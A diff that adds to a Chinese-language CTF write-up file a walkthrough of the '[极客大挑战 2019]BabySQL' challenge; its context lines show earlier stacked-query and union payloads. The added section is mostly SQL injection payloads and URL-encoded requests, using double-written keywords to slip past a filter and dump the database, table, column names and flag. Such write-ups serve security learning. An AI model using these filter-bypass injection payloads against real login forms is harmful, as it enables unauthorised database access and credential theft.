@@ -160,3 +160,116 @@ Payload："1';rename table `words` to `words1`;rename table `1919810931114514` t
 7. ?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&password=ads
 
    得到flag
+
+# [极客大挑战 2019]BabySQL 1
+
+1. 直接尝试万能密码1' or '1'='1    1' or '1'='1
+2. 直接进行sql注入
+
+   尝试1’ order by 3# 发现order中的or被过滤，同时by也被过滤
+
+   因此直接尝试联合注入
+
+   Payload:
+
+   username=1’union select 1#&password=1
+
+   Url:
+
+   username=1%27union%20select%201%23&password=1
+3. 可以发现这里union select都被过滤了，因此尝试双写绕过
+
+   Payload:
+
+   username=1’ununionion seselectlect 1#&password=1
+
+   url:
+
+   username=1%27ununionion%20seselectlect%201%23&password=1
+4. 发现有回显，显示列数不同，因此双写绕过是可行的
+
+   继续试列数
+
+   Payload：
+
+   username=1’ununionion seselectlect 1,2,3#&password=1
+
+   Url:
+
+   username=1%27ununionion%20seselectlect%201,2,3%23&password=1
+5. 有回显，找到正确列数三列
+
+   接下来查询数据库
+
+   Payload:
+
+   username=1’ununionion seselectlect 1,version(),database()#&password=1
+
+   Url:
+
+   username=1%27ununionion%20seselectlect%201,version(),database()%23&password=1
+6. 成功显示数据库，接着查询表名
+
+   Payload:
+
+   username=1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1
+
+   Url:
+
+   username=1%27ununionion%20seselectlect%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&password=1
+7. 可看出information,from被过滤
+
+   因此继续双写绕过
+
+   Payload:
+
+   username=1’ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#&password=1
+
+   Url:
+
+   username=1%27ununionion%20seselectlect%201,2,group_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%23&password=1
+8. 可看出所有的数据库information_schema,mysql,performance_schema,test,ctf,geek
+
+   查询表名（继续使用联合查询）需要双写的有information，from，where
+
+   Payload:
+
+   username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=’geek’#&password=1
+
+   Url:
+
+   username=1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27geek%27%23&password=1
+9. 得到geek数据库里的表b4bsql,geekuser，发现flag不在此数据库中
+
+   因此直接试ctf的表
+
+   Payload:
+
+   username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=’ctf’#&password=1
+
+   Url:
+
+   username=1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27ctf%27%23&password=1
+10. 发现ctf数据库中存在Flag表
+
+    查询表中的字段名
+
+    Payload:
+
+    username=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=’ctf’#&password=1
+
+    Url:
+
+    username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23&password=1
+11. 接着查询flag中内容
+
+    Payload:
+
+    username=1’ ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&password=1
+
+    Url:
+
+    username=1%27%20ununionion%20seselectlect%201,2,group_concat(flag)%20frfromom%20ctf.Flag%23&password=1
+
+
+
